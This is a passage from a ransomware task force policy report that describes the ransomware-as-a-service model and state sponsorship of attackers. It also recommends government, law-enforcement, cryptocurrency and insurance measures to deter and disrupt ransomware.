payments as their records had been lost. \n\nNotPetya was a stark example of how ransomware attacks can affect the very functioning of a \nsociety, and erode the trust that citizens hold in public institutions.\n\nSocietal Impact: NotPetya\n\nIn this model, even a non-technical affiliate can successfully execute ransomware attacks by purchasing \nthe necessary exploits and malware. RaaS can be contrasted with more traditional ransomware gangs, \nin which a cohesive team both builds the malware and executes the attack. The Sobinokibi, Phos, \nDharma, and GlobeImposter ransomware variants are all known to operate under the RaaS model.37\n\nThe Nation-State Nexus\nOf particular interest to the Task Force was the relationship between ransomware and national \ngovernments. Many ransomware criminals operate with impunity, as their countries’ governments \nare unwilling or unable to prosecute this form of crime. In other cases, the organizations executing \nransomware attacks may be state-sponsored, and may in fact be helping nations evade economic \nsanctions.38 For example, in an April 2021 announcement of new sanctions against Russia, the U.S. \nDepartment of Treasury made a direct connection between Russia’s Federal Security Service (FSB) \nand ransomware hackers, noting that “to bolster its malicious cyber operations, the FSB cultivates \nand co-opts criminal hackers, including the previously designated Evil Corp, enabling them to engage \nin disruptive ransomware attacks and phishing campaigns.”39 \n\nProceeds from ransomware may help finance terrorism, human trafficking, or the proliferation of \nweapons of mass destruction.40 For these reasons, direct affiliation between ransomware attacks and \ngovernments is intentionally shrouded in secrecy, making attribution and accountability challenging. \nCountering state-sponsored attackers will require broad application of “carrot and stick” methods and \ninternational cooperation. \n\nIntroduction\n\n\n\nIST 18Combating Ransomware\n\nExisting Efforts to Mitigate Ransomware Attacks \nRansomware is not a new problem. As attacks have increased in prevalence and impact, significant \neffort has gone into understanding and addressing the array of associated issues. This includes the \ndevelopment of technical tools, critical research on attacker groups and trends, best practice guides \nfor preparation, established threat intel sharing programs, and attack nullification efforts.\n\nThe security field has well-known, pre-existing resources for cyber hygiene,42 staff training,43 and \nsecuring resources.44 Cybersecurity firms can provide network monitoring, anomaly detection, \nand containment. Incident response teams have been established across government,45 industry, \nand nonprofits, and at a systemic level, federal funding, information sharing, and public-private \npartnerships have been proposed to improve cyber response across organizations.46\n\nYet adoption of preparedness best practices remains limited, and ransomware attackers continue \nto find sectors and elements of society that are woefully underprepared for this style of attack. The \nsheer volume of content published on the topic of ransomware is part of the challenge; with so \nmuch information and noise surrounding this threat, time- and resource-constrained organizations \nand individuals struggle to identify the most relevant and accurate sources of useful information. In \naddition, many guides are reportedly either too simple, too complicated and overwhelming, or not \nspecific to ransomware. Operational security and IT staff represented in the Task Force reported that \nit is a struggle to find guidance that is truly actionable and feels relevant to their needs. \n\nSignificant effort remains to address the increasing risks posed by ransomware attacks. The \nsheer volume of attacks hitting such a broad range of sectors leaves even private sector security \ncompanies often lacking the capacity to respond to the number of requests for assistance. In \nresponse, federal governments have taken steps to coordinate information sharing and raise \nawareness around the risks posed by ransomware: for example, in January 2021, CISA unveiled the \nReduce the Risk of Ransomware Campaign to encourage public- and private-sector organizations \nto implement best practices, tools, and resources that can help them mitigate ransomware risk.47 \nThe U.S. The Dutch National Police, Europol, McAfee, and Kaspersky Lab founded an initiative called \n“No More Ransom”, which provides decryption keys, information on ransomware, and preventative \nadvice, and has done so for years.48 The UK’s National Cyber Security Centre also provides useful \ninformation and guidelines on how to mitigate ransomware.49 Coordinated global law enforcement \nactions have led to isolated successes; in January 2021, for example, a coordinated effort led to the \ndisruption of the EMOTET botnet, a major component of ransomware criminals’ infrastructure.50\n\nDespite these efforts, ransomware attacks have continued to grow almost unabated, and the \ncriminals behind them continue to operate with near impunity. What began as a relatively minor \nnuisance to people and business is now causing losses in the billions of dollars, and attackers have \ncontinued to target critical public facilities like schools and hospitals. Solutions have been deployed \nin an uncoordinated, disjointed manner, with different sectors working on siloed solutions. The \nransomware threat cannot be stopped via piecemeal solutions; it needs the dedicated, coordinated \nattention of experts, from policymakers to security engineers to industry leaders. \n\nIntroduction\n\n\n\nIST 19Combating Ransomware\n\nRansomware has become too large of a threat for any one entity to address; the scale and magnitude \nof this challenge urgently demands coordinated global action. In response, in early 2021, the Institute \nfor Security and Technology (IST) convened the Ransomware Task Force (RTF), an interdisciplinary \ngroup of leaders, for a three-month sprint with the goal of producing a comprehensive framework \nof actionable solutions and recommendations to help public- and private-sector leaders reduce the \nthreats posed by ransomware in the near and long term. \n\nThis strategic framework aims to help policymakers and industry leaders take system-level action — \nthrough potential legislation, funding new programs, or launching new industry-level collaborations — \nthat will help the international community build resistance, disrupt the ransomware business model, \nand develop resilience to the ransomware threat.\n\nThe framework is organized around four goals: deter ransomware attacks through a nationally \nand internationally coordinated, comprehensive strategy; disrupt the ransomware business model \nand reduce criminal profits; help organizations prepare for ransomware attacks; and respond to \nransomware attacks more effectively. \n\nThese goals are interlocking and mutually reinforcing. For example, actions to disrupt the \nransomware payments system will decrease the profitability of ransomware, thereby helping to \ndeter other actors from engaging in this crime. Conversely, without taking the recommended steps \nto deter ransomware attackers, disruption will be harder to achieve. In a similar vein, many actions \ntaken to better prepare organizations for ransomware attacks, such as informing them about the \nrisks, will also improve their ability to respond, while understanding more about how organizations \nare responding to ransomware attacks will help improve organizations’ collective preparedness. \nThus, this framework should be considered as a whole, not merely a laundry list of potential \ndisparate actions. \n\nA Comprehensive Framework for Action:  \nKey Recommendations from the Ransomware Task Force\n\nRecommendations at a glance:\n\n1. �Deter  \nRansomware \nAttacks\n\n2. �Disrupt the \nransomware \nbusiness model\n\n3. �Help  \norganizations \nprepare\n\n4. �Respond to \nransomware \nattacks  \nmore effectively\n\nA Comprehensive Framework for Action\n\n\n\nIST 20Combating Ransomware\n\nA Note on the U.S. Focus and International Application\n\nRansomware, like our digital world, knows no bounds. All of these recommendations seek to \nleverage the power of multi-stakeholder collaboration, nationally and globally, to combat a crime that \ntranscends borders and attacks indiscriminately. Many recommendations, like enforcing compliance \non cryptocurrency entities to drive ransomware actors out of business, will be unsuccessful without \ninternational collaboration. A single country’s laws or capabilities will be insufficient to tackle this \nglobal threat. \n\nWhile the Ransomware Task Force involved participants from around the world, the majority of \nmembers were based in the United States and were primarily familiar with the U.S. legal and policy \nlandscape. As a result, and to help ensure our recommendations are specific and actionable, the \nfindings and recommendations detailed in this report have a decidedly U.S.-focused lens. However, \nwe believe many of the recommendations can and should also be translated to other jurisdictions. \n\nThe effort to combat ransomware will only be successful if carried out through a coordinated, \ninternational effort. The following recommendations carry universal themes, like improving \nransomware preparedness in organizations. We encourage agencies and organizations in other \nnations — including cybersecurity, law enforcement, government and industry leaders — to adapt \nthese recommendations to their own contexts, and work across borders to coordinate and tackle \nwhat is truly a global challenge. \n\nA Comprehensive Framework for Action\n\n\n\n21Combating RansomwareIST A Comprehensive Framework for Action: Goal #1\n\nDeter ransomware attacks through a  \nnationally and internationally coordinated, \ncomprehensive strategy\n\nGoal #1\n\nObjective 1.1:  \nSignal that ransomware is an international diplomatic and enforcement priority\n\nInternational governments must cooperate more purposefully and publicly to send an \neffective signal to ransomware criminals that this form of cybercrime is a diplomatic and \nlaw enforcement priority. A clear declarative policy will serve as a foundation to other \ninternational and national-level efforts.\n\nAction 1.1.1: Issue declarative policy through coordinated international diplomatic statements  \nthat ransomware is an enforcement priority.\n\nUsing existing high-level forums (such as the G7, G7 Finance Ministers, G20, Interpol, Europol, and others51), \nsenior-level officials and ministers from major nations should agree to one or more joint declarations condemning \nransomware as a national security concern and/or a threat to critical infrastructure, and commit to pursue \nransomware actors. There are several international52 precedents53 for this declarative policy. This declaration \nshould outline the steps signatories will mutually agree to take, and include an agreement for each nation to create \na domestic action plan.\n\nTiming: Begin immediately to lay the groundwork; declarations would be issued when the groups meet. \nLead: State Department, National Security Council (NSC), Treasury, Department of Homeland Security (DHS),  \nand Department of Justice, in coordination with international partners.\n\nAction 1.1.2: Establish an international coalition to combat ransomware criminals.\n\nA standing international coalition composed of representatives from key nations is necessary as a conduit \nfor sharing information and other resources related to the ransomware threat. Such a coalition should include \nrepresentatives from law enforcement using successful models like Europol’s Joint Cybercrime Action \nTaskforce,54 but also including the intelligence community, and private industry. It should carry out key shared \n\nThe number of actors capable of conducting ransomware attacks is large and growing, and to \ncurb the growth of this threat in the long-term, steps must be taken to systemically discourage \nransomware attacks. This deterrence must be multilayered and rely on all instruments of \nnational power. We propose a coordinated, effectively messaged, relentlessly executed \ndeterrence campaign directed from the senior-most levels of the U.S. Government in real-time \ncollaboration with international partners. The actions recommended here are to be directly \nsupplemented by the disruption activities recommended in Goal #2.\n\n\n\nIST 22Combating Ransomware A Comprehensive Framework for Action: Goal #1\n\ntasks, such as building a legal case against criminal actors, pursuing targets/groups through pooling resources \nand tools, and amplifying takedowns when they happen. This effort would directly coincide with those detailed in \n1.1.1 and 1.1.3, but also throughout the actions recommended under Goal #2. \n\nTiming: 3-6 months.\t Lead: White House, in coordination with international partners.\n\nAction 1.1.3: Create a global network of ransomware investigation hubs.\n\nThe U.S. Government should lead the development of a network of ransomware investigative hubs across the \nglobe, including by leveraging cyber assistant legal attachés (ALATs) and International Computer Hacking and \nIntellectual Property (ICHIP) lawyers. The groups within this “team of teams” should be nimble and have access \nto specialists in each of the kill chain areas of the ransomware criminal organizations. The hubs should ensure \ntheir investigative priorities and resources are aligned and coordinated. They should foster a culture of information \nsharing, be located in diverse geopolitical regions to enable swift sharing of intelligence, and contribute directly to \nthe coalition recommended above in Action 1.1.2, but also to the actions recommended below in Objective 1.2 and \nmany of the actions under Goal #2. \n\nTiming: 9-12 months.\t Lead: �State Department, Department of Justice, and international equivalents.\n\nAction 1.1.4: Convey the international priority of collective action on ransomware via sustained \ncommunications by national leaders.\n\nAny international effort will need to include coordinated public communications by national leaders to keep \nthe spotlight on combating ransomware as a priority and ensure the success of the broader effort. These \ncommunications can take the form of speeches, op-eds, news articles, videos, and other media that draw \nattention to ransomware as a problem, promote prevention, and highlight enforcement successes. \n\nTiming: Begin immediately to lay the groundwork; declarations must be issued on an ongoing basis.  \nLead: White House, in coordination with international partners.\n\nObjective 1.2:  \nAdvance a comprehensive, whole-of-U.S. government strategy for reducing ransomware \nattacks, led by the White House\n\nRansomware is an urgent threat that demands a “whole-of-government” strategic response. \nWithin the U.S. Government, establishing structures for cross-agency coordination will be vital \nfor tackling the ransomware challenge, and will reduce the lag time in government response. \nLeading new joint efforts with industry will also be crucial: no single actor is fully capable \nof disrupting this threat by themselves, so we must come together to assess the threat and \ncoordinate activities across authorities and capabilities. Although this recommendation \nis U.S.-focused, a similar approach should be adopted by other national governments. \nAdditionally, since ransomware is a cross-border issue, it will be vital for governments to reach \nout to, and work with, international partners both on a policy and operational level.\n\n\n\nIST 23Combating Ransomware\n\nAction 1.2.1: Establish an Interagency Working Group for ransomware.\n\nTo ensure this challenge receives sufficient investment of time and resources from the highest levels of the \nU.S. federal government, the White House should establish an Interagency Working Group (IWG) dedicated to \nunderstanding and addressing the ransomware threat at a systemic level, and on an ongoing basis. Doing so will \nsignal to ransomware actors and international partners that this issue rises above other pressing cybersecurity \npriorities. Ideally led through the National Security Council (NSC) in coordination with the new National Cyber \nDirector (NCD), the Ransomware IWG will serve as a high-level strategic forum for coordinating expertise, shaping \npolicy, sharing information, and directing action for all stakeholders. \n\nThe Ransomware IWG will also help ensure that intragovernmental conflicts can be escalated efficiently through \nthe White House policy-coordination and national security decision-making process. The IWG should provide \npolicy direction and leadership for all U.S. Government actions related to ransomware, which will improve \naccountability and help ensure that agencies work together on signaling and deterrence. In addition, the NSC/NCD, \nState Department, DHS, DOJ, Treasury, and other relevant members of the IWG should engage international allies \nand partners to build a like-minded coalition against ransomware and ensure policy coordination, as called for in \nAction 1.1.2. \n\nTiming: Immediate.\t Lead: White House and international equivalents.\n\nAction 1.2.2: Establish an operationally focused U.S. government Joint Ransomware Task Force \n(JRTF) to collaborate with a private-sector Ransomware Threat Focus Hub.\n\nThe Interagency Working Group (IWG) described in Action 1.2.1 should direct and oversee the creation of an \ninternal U.S. government Joint Ransomware Task Force (JRTF), whose objective is to coordinate an ongoing, \nnationwide campaign against ransomware, and identify and pursue opportunities for international cooperation. \nThe JRTF’s primary function is to identify targets for disruption and takedown, and clearly designate roles and \nresponsibilities for each. The U.S. government needs this formal interagency structure to avoid uncoordinated \nactivity and to break down the stovepipe structure. The JRTF must be empowered to leverage all tools of national \npower and should prioritize ransomware threats to critical infrastructure. The JRTF should increase the pace and \nefficacy of intelligence-driven ransomware infrastructure takedowns, disruptions of ransomware operations, and \narrest and prosecution of the people that enable them. A detailed breakdown of a potential structure, roles, and \nresponsibilities for the JRTF are provided in Appendix C. \n\nThe JRTF should collaborate closely with relevant private-sector organizations that can help defend against and \ndisrupt ransomware operations, such as security vendors, platform providers, telecommunications providers, \ninformation sharing organizations, cybersecurity non-profits, and other capable entities. These private-sector \nactivities and groupings can continue to operate on an informal and ad hoc basis through the establishment of a \nRansomware Threat Focus Hub (RTFH), which can serve as a central, organizing node for informal networks and \ncollaboration as part of a collaborative, sustained public-private anti-ransomware campaign. The structure, roles, \nand responsibilities of the RTFH are also provided in Appendix C. \n\nTiming: Immediate.\t Lead: �White House, via the direction of the IWG, in coordination with private industry, \nand international equivalents.\n\nA Comprehensive Framework for Action: Goal #1\n\n\n\nIST 24Combating Ransomware\n\nAction 1.2.3: Conduct a sustained, aggressive, public-private collaborative anti-ransomware campaign.\n\nThe JRTF should use all tools of national power to sustain an intelligence-driven anti-ransomware campaign \nthat includes target identification, threat hunting, action planning, execution, and communications. The roles and \nresponsibilities covered within the JRTF should include, but not be limited to: law enforcement action, diplomatic \nefforts, economic tools, technical cyber operations, and intelligence operations as appropriate. The campaign and \ncapabilities utilized should be tailored to target specific vulnerabilities in ransomware groups and their operations \nas identified in the intelligence assessments recommended in Actions 1.2.5 and 1.2.6. Coordination of operations, \nand intelligence sharing that supports those operations, should be streamlined with exceptions to policy as \nneeded to be most effective in targeting groups on the designated list. This should include sharing and operational \ncoordination with U.S. government entities, private industry (e.g. cybersecurity companies, service providers, and \ntrust groups), and a coalition of international partners.\n\nThe JRTF should enhance operational coordination with their international counterparts to conduct more, \nand more effective, international investigations and take-downs. This would be directly facilitated through the \ninvestigative hubs recommended in Action 1.1.3. The JRTF should, to the greatest extent possible, operate at the \nunclassified level, which is essential to enable flexibility, quick reaction times, and the incorporation of essential \npartners who are not JRTF members. To make this possible, the U.S. government should follow the lead of its \ncounterparts in the United Kingdom’s National Cyber Security Center and dramatically increase the volume of TS/\nSCI information made available at the unclassified level, with a singular focus on the ransomware threat.\n\nThe JRTF can ensure agreements are in place with designated private-sector partners to allow for field level \ncoordination, and must coordinate early and frequently with all relevant elements of U.S. departments and \nagencies, for instance, the NCIJTF and select U.S. Attorney Offices. \n\nVia the private-industry Ransomware Threat Focus Hub (RTFH), as detailed in Appendix C, non-government \nparticipants in these campaigns could include infrastructure providers, platform/OS providers, registrars, endpoint \nsecurity companies, threat intelligence firms, content delivery networks (CDNs), network operators, non-profits, \nand industry nodes. Engagement, planning, and execution should not be limited to regularly scheduled meetings; \nrather, the structure should allow for continuous, responsive, and ad hoc coordination and execution based on \nconstantly changing events. \n\nTiming: 3-6 months.\t Lead: �White House, via the direction of the IWG in Action 1.2.1, in coordination with \nprivate industry, and international equivalents.\n\nA Comprehensive Framework for Action: Goal #1\n\n\n\nIST 25Combating Ransomware\n\nAction 1.2.4: Make ransomware attacks an investigation and prosecution priority, and communicate \nthis directive internally and to the public.\n\nThe Department of Justice (DOJ) recently formed an internal task force to tackle ransomware and the Acting \nDeputy Attorney General issued guidance making ransomware an investigatory priority. The Task Force supports \nthis focus on ransomware and recommends that senior officials, such as the Attorney General, the Director of the \nFBI, and/or the Director of the United States Secret Service, sustain this focus at United States Attorney’s Offices \n(USAOs), FBI field offices, and Secret Service Task Forces to more aggressively pursue cases against ransomware \nactors. Consistent with this guidance, USAOs should prioritize ransomware prosecutions and seek harsher \npenalties for attacks on critical infrastructure or for attacks that endanger public health and safety.\n\nLegislation should also be considered to make ransomware and other Computer Fraud and Abuse Act offenses \nsubject to RICO, given the organized crime aspects of these offenses. Additionally, to raise the level of priority and \nclearly communicate that new status, officials should also pursue asset forfeiture against ransomware actors to \nthe maximum extent allowed by law and signal their intention to use this tool. This recommendation is expanded \nupon further in Actions 2.1.5 and 2.3.3. \n\nTiming: 9-12 months.\t Lead: U.S. Department of Justice and Congress, and international equivalents.\n\nFIGURE 5  Proposed Framework for a Public-Private Operational Ransomware Campaign\n\nRansomware Interagency \nWorking Group (IWG)\n\nAction 1.2.1\nNSC/NCD-led\n\nUSG Departments \nand Agencies\n\nExisting  \nCoordination  \n\nGroup(s)\n\nJoint Ransomware \nTask Force (JRTF)\n\nAction 1.2.2\nInteragency Operational Level\n\nRansomware  \nThreat Focus Hub\n\nAction 1.2.2\nPrivate Sector Facilitator\n\nA Comprehensive Framework for Action: Goal #1\n\n\n\nIST 26Combating Ransomware\n\nAction 1.2.5: Raise the priority of ransomware within the U.S. Intelligence Community, and designate \nit as a national security threat.\n\nThe United States must raise the Intelligence Community (IC) collection priority against ransomware actors \nso that all necessary resources, capabilities, and authorities can be brought to bear to answer the intelligence \nneeds to fulfill the tasks of the IWG and the JRTF. These must include (but are not limited to): signals intelligence \n(SIGINT) (including computer network operations, or CNO), human intelligence (HUMINT), and imagery intelligence \n(IMINT). This elevated prioritization must be accompanied by a reduction in the roadblocks that impede greater \nbidirectional sharing of information between the IC, international IC partners, and private industry, in order to fulfill \nthe intelligence needs of the IWG and the JRTF’s campaigns.\n\nTo establish the baseline for target development, the NSC should task an Intelligence Community Assessment \n(ICA) focused solely on ransomware actors and the criminal-state nexus. The goal of this ICA should be to \naccurately capture: the nature of the ransomware threat to national security; identification of actors and groups \nwho pose the most significant threat (including attribution to individuals involved whenever possible); locations \nfrom where they operate; and the infrastructure, tactics, and techniques they commonly use. The ICA should \nalso detail vulnerabilities that may exist within each actor group; any relationships between the actors and their \ngovernments that could negatively impact law enforcement’s ability to counter the threat; and any intelligence \ngaps that would need to be filled to more completely understand this threat. \n\nBased on the findings in the ICA and any other relevant intelligence, the IC should clearly designate ransomware \nactors as a national security threat at the level appropriate to the findings, and raise the priority of actively \ncountering the threat. The designation and priority level should ensure that all tools of national and international \npower are brought to bear to counter this threat in an aggressive, effective, but proportional, coordinated \ncampaign, as is detailed in 1.2.3. \n\nTiming: 3 months.\t Lead: �White House to task DNI, coordinate with Five Eyes Partners and international \nequivalents.\n\nAction 1.2.6: Develop an international-version of an Intelligence Community Assessment (ICA) on \nransomware actors to support international collaborative anti-ransomware campaigns.\n\nInternational partners should work together to develop an international Intelligence Community Assessment (ICA) \non ransomware actors with the same goals described in Action 1.2.5 in order to create a more complete picture of \nthe global security threat posed by ransomware actors, and to serve as the baseline for coordinated international \nefforts. An international ICA will help raise the global intelligence collection priority against ransomware actors so \nthat all necessary resources can be brought to bear to answer the intelligence needs required to fulfill national and \ninternational collaborative efforts. \n\nTiming: 3 months.\t� Lead: �White House to task DNI, coordinate with Five Eyes Partners and international \nequivalents.\n\nA Comprehensive Framework for Action: Goal #1\n\n\n\nIST 27Combating Ransomware\n\nObjective 1.3:  \nSubstantially reduce safe havens where ransomware actors currently operate with impunity\n\nMany pernicious ransomware actors are given free reign by the nations where they reside \nand cannot be easily reached by international law enforcement agencies, either because a \nhost country is actively protecting them, lacks the resources and capabilities to stop them, \nor does not prioritize the issue. Together with international partners, the U.S. should use \na “carrot and stick” approach to motivate these nations to use all tools of national power \n— including critical law enforcement action — against the criminals operating within their \nborders or within friendly or neighboring countries.\n\nAction 1.3.1: Exert pressure on nations that are complicit or refuse to take action.\n\nNations should exert pressure on other nations that refuse to take action against ransomware criminals. These \nstrategies could include economic and trade sanctions; constrain “safe haven” country activity in international \nfinancial markets; using evidence of complicity to “name and shame” them in public forums to disrupt their \nfreedom of activity; withholding military or foreign assistance aid; or denying visas to citizens who seek to travel \nto the United States or other nations. Actions undertaken by the JRTF and the RTFH to disrupt the ransomware \nbusiness model should proactively be utilized to contribute to the intended deterrent effect of this sustained \npressure campaign. \n\nTiming: 3 months, ongoing. \t Lead: U.S. Department of Justice and U.S. Department of State.\n\nAction 1.3.2: Incentivize cooperation and proactive action in resource-constrained countries.\n\nSome nations that serve as home bases for ransomware actors may not understand the gravity of this crime, \nor they may lack sufficient resources to prosecute ransomware criminals. The United States and other nations \nshould provide training and capacity-building to support these nations’ efforts, and provide direct law enforcement \nsupport, for example through joint law enforcement operations. Providing incentives to private-sector partners in \nthose nations may also increase these nations’ willingness to cooperate. Establishing ransomware as a priority in \nbilateral agreements could further bring these nations to the table. \n\nTiming: 30 days and ongoing. \t Lead: �U.S. Department of Justice and Department of State, and international \nequivalents.\n\nA Comprehensive Framework for Action: Goal #1\n\n\n\nIST 28Combating Ransomware\n\nObjective 2.1:  \nDisrupt the system that facilitates the payment of ransoms.\n\nRansomware attacks are profitable because ransom payments are made through the use of \ndiverse cryptocurrencies, where payments are difficult to trace and can easily be laundered. \nThe challenge for governments is to find new ways to get inside the ransomware payments \nprocess. It will be important to set measurable goals to assess progress toward this objective.\n\nAction 2.1.1: Develop new levers for voluntary sharing of cryptocurrency payment indicators. \n\nIn addition to the mandatory disclosure of a ransomware payment recommendation in Action 4.2.4, lawmakers \nshould create incentives to share timely and actionable cryptocurrency payment indicators to enable law \nenforcement to prioritize leads and seize ransom payments when possible. This information may include wallet \naddresses, transaction hashes, and ransom notes. In exchange for this information, victims should be able to \nreport anonymously, unless a victim is otherwise required to disclose the attack under privacy laws. Congress \nshould broaden the Cybersecurity Information Sharing Act of 2015 to cover this type of information sharing, \nexplicitly preserving attorney-client privilege and implementing parameters that limit how this information could \nlater be used by regulators or as part of civil litigation, to encourage participation. \n\nTiming: 6 to 12 months.\t Lead: Congress, CISA, and other international equivalents. \n\nDisrupt the ransomware business model  \nand decrease criminal profits\n\nGoal #2\n\nRansomware is overwhelmingly a financially motivated crime, and as long as the profits \noutweigh the risks, attacks will continue. To effectively disrupt this threat, government and \nindustry stakeholders must work collaboratively across borders to reduce the profitability of \nthis criminal enterprise and increase the risk of ransomware execution. Governments can take \ndiverse actions to: \n\n1.\t Disrupt payment systems to make ransomware attacks less profitable; \n2.\tDisrupt the infrastructure used to facilitate attacks; and \n3.\t� Disrupt ransomware actors themselves, through criminal prosecution and other tactics. \n\nThis must all be done while minimizing harm to the victims of ransomware and not interfering \nwith their ability to recover their systems.\n\nThe flow of money from a victim to a ransomware actor using cryptocurrency is complex.  \nSee Appendix B for a detailed guide on this process, and how entities like cryptocurrency exchanges  \nfit within this ecosystem. \n\nA Comprehensive Framework for Action: Goal #2\n\n\n\nIST 29Combating Ransomware\n\nAction 2.1.2: Require cryptocurrency exchanges, crypto kiosks, and over-the-counter (OTC) trading \n“desks” to comply with existing laws.\n\nLawmakers need to pursue and enforce consistent licensing and registration requirements for cryptocurrency \nexchanges, crypto kiosks, and OTC trading desks where criminals “cash out” their cryptocurrency from ransomware \npayments. These entities are not consistently compliant with or subject to Know Your Customer (KYC), Anti-Money \nLaundering (AML), and Combatting Financing of Terrorism (CFT) laws, and those that are subject to those laws do \nnot consistently report suspicious transactions to law enforcement or other institutions.56 These laws must designate \nclear enforcement bodies to penalize non-compliant exchanges, kiosks, and OTC desks. \n\nCryptocurrency  \nExchanges\n\nCryptocurrency exchanges \nallow users to buy and sell \ncryptocurrencies in exchange \nfor traditional currencies, \nas well as convert to other \nvirtual currencies. \nExchanges act as \nmiddlemen between \nbuyers and sellers.\n\nCryptocurrency  \nKiosks\n\nKiosks that sell, buy, and \nexchange cryptocurrency. \nThey can be located \nanywhere and look like \nATMs. They tend to \ncharge more than \ncryptocurrency \nexchanges. Kiosks \nact as middlemen \nbetween buyers \nand sellers.\n\nOver-the-Counter (OTC) \nTrading Desks \n\nOver-the-counter (OTC) \ncryptocurrency trading \nallows people to buy from or \nsell to a “desk,” a business \nfocused on buying and \nselling cryptocurrency. \nThere is thus no \nmiddleman between \nthe seller and buyer, \nand OTC tends to \nsee larger crypto \npurchases and sales.\n\nAn even smaller \ngroup of 25 \n\naddresses \naccounted for \n\nof all funds sent by \nransomware addresses \nin 2020\n\n80%  Just 199 deposit \naddresses received\n\n46%55 \n\nRecent \npublicly \navailable \nanalytical \nreporting \nestimates \nthat\n\nWith a broader and deeper understanding of the ransomware landscape, law enforcement \nwould be better equipped to target the most prolific actors. \n\nA Comprehensive Framework for Action: Goal #2\n\n\n\nIST 30Combating Ransomware\n\nTraditional financial institutions that fund these entities should also impose stricter rules. They should pursue \nSEC enforcement of cryptocurrency businesses that fail to register as broker-dealers, transfer agents, clearing \nagencies, and money service businesses (MSBs), with particular focus on mixing services that obfuscate criminal \ntransactions with legal traffic. \n\nTiming: 12 months.\t Lead: �Treasury Department, Securities and Exchange Commission, and other \ninternational equivalents.\n\nAction 2.1.3: Incentivize voluntary information sharing between cryptocurrency entities and law \nenforcement. \n\nRegulators should incentivize cryptocurrency exchanges, crypto kiosks, over-the-counter trading desks, and \nfinancial institutions to increase their reporting of suspicious transactions to federal law enforcement, to facilitate \njoint disruptive actions. In the U.S., these entities would use Section 314(b)57 reports and suspicious activity \nreports (SARs) to report suspicious transactions to the Financial Crimes Enforcement Network (FinCEN) of the \nU.S. Treasury Department. In addition, the Department of Treasury should streamline its processes for sharing \nSARs with exchanges, blacklisting wallets, and sharing with relevant federal and non-federal entities that may take \nother timely disruptive action. \n\nTiming: 12 months. \t Lead: U.S. Treasury Department (FinCEN) and international equivalents.\n\nAction 2.1.4: Centralize expertise in cryptocurrency seizure, and scale criminal seizure processes. \n\nLaw enforcement action on the basis of ransomware reporting must be swift as criminals strive to quickly \nmove funds beyond their reach. In the U.S., law enforcement can provide a cryptocurrency exchange with \na letter requesting that ransomware funds be frozen at the exchange as proceeds of crime to be seized by \nthe government. If done in time and with cooperation from the exchange, this can make the identified funds \nunavailable to the ransomware actors. This letter must be followed up with a seizure order from an attorney within \nthe Department of Justice, a process that, at the moment, is scattered across the United States, assigned to \ndifferent investigations, and assigned to attorneys with varying experience drafting these orders.\n\nKey units within the Department of Justice — including the Computer Crime and Intellectual Property Section \n(CCIPS), Computer Hacking and Intellectual Property Network (CHIPS), National Security Cyber Specialists \n(NCSC), the National Security Division (NSD), and the Money Laundering and Asset Recovery Section (MLARS) \n— should identify attorneys who are knowledgeable in civil and criminal seizures related to cryptocurrency, and \nengage them to serve as a focal point for seizure orders across ransomware investigations. This should be \npart of the campaign tasked to the JRTF described in Action 1.2.2 or to the recently formed DOJ ransomware-\nfocused task force. This would dramatically streamline the current process, ensure seizure orders are pursued \nexpeditiously, and increase the number of seizure orders served, thereby making it more difficult for ransomware \nadversaries to convert virtual currency to fiat. \n\nTiming: 6 to 12 months. \t Lead: U.S. Department of Justice and international equivalents.\n\nA Comprehensive Framework for Action: Goal #2\n\n\n\nIST 31Combating Ransomware\n\nAction 2.1.5: Improve civil recovery and asset \nforfeiture processes by kickstarting insurer \nsubrogation. \n\nFor individual ransomware victims, the economics of \npursuing civil remedies against liable actors may not \nmake sense, given the case may require extensive \nfactual investigation and innovative legal efforts. To \nsolve this problem, insurers and reinsurers should \nmeasure and assert their aggregated ransomware \nlosses and establish a common “war chest” \nsubrogation fund to evaluate and pursue strategies \naimed at subrogation recoveries, including restitution, \nrecovery, or civil asset seizures, on behalf of victims \nand in conjunction with law enforcement efforts. \n\nMany insurers currently maintain individual subrogation \nunits, but these do not typically act within the context \nof ransomware. This is because insurers may not be \nfamiliar with the novel legal and investigative expertise \nneeded to pursue ransomware actors; they may believe \nthe chances of recovery are unclear, and the cases \nmay span multiple international jurisdictions where \ninsurers may not typically pursue subrogation. This \ncommon “war chest” subrogation fund may sit within \na consortium (as described in Action 2.1.7) established \nby insurers and reinsurers to properly resource and \nscale novel efforts to pursue civil recoveries against \nliable actors, kickstarting efforts in civil courts to obtain \njustice, while pooling the costs associated with any one \ncase, alleviating concerns about uncertain results. \n\nTiming: 6 to 12 months.  \nLead: Domestic and international insurance and \nreinsurance firms.\n\nA Comprehensive Framework for Action: Goal #2\n\nThe IRS and Europol have engaged in efforts to \nidentify taxpayers who have failed to disclose \nincome from cryptocurrency, including developing \n“tax evasion signatures” within cryptocurrency \ntransactions. In 2021, the IRS’s Office of Fraud \nEnforcement announced “Operation Hidden \nTreasure,” convening trained IRS criminal \nagents and blockchain analysis firms to identify \ncryptocurrency-related tax fraud.58 National \nand international tax authorities and interested \npolicymakers should further investigate \nopportunities to leverage tax enforcement efforts \nlike these in the fight against ransomware. \n\nFor Further Investigation:  \nThe Tax Enforcement  \nOpportunity\n\nSubrogation refers to an insurer’s assumption of \nan insured victim’s rights of recovery after a loss \nis covered and paid by the insurer. Subrogation \nempowers an insurer to pursue the rights of the \ninsured to recover the amount of a loss from the \nparties who are legally liable for it. Subrogation \nthus serves to make both victim and insurer \n“whole” in the event of a civil recovery. For more \ninformation, see Appendix A: Cyber Insurance.\n\nWhat is subrogation? \n\n\n\nIST 32Combating Ransomware\n\nAction 2.1.6: Launch a public campaign tying ransomware tips to existing anti-money laundering \nwhistleblower award programs.\n\nIn 2012, the U.S. Securities and Exchange Commission (SEC) launched a whistleblower reward program that \nhas already yielded several billion dollars in penalties that the U.S. would not have otherwise obtained. A public \nwhistleblower campaign in this vein should be targeted toward geographic regions around the world, and provide \nawards for information leading to the identification of individuals involved with developing ransomware, money \nlaundering of fiat, coding, ransom negotiations, and other roles. In addition to financial awards, such a program \ncould include non-monetary rewards, such as a path to citizenship. Any reward program should be designed in a \nway to protect the anonymity of the reporter of the criminal activity. \n\nTiming: 6 to 12 months. \t Lead: The Securities and Exchange Commission and international equivalents.\n\nAction 2.1.7: Establish an insurance-sector consortium to share ransomware loss data and \naccelerate best practices around insurance underwriting and risk management.\n\nInsurers and reinsurers should voluntarily establish an industry consortium to aggregate and share anonymized, \npertinent data to support threat-actor disruption, including both payment information (such as wallet addresses, \nransom demands, negotiation outcomes, and transaction hashes) and attack 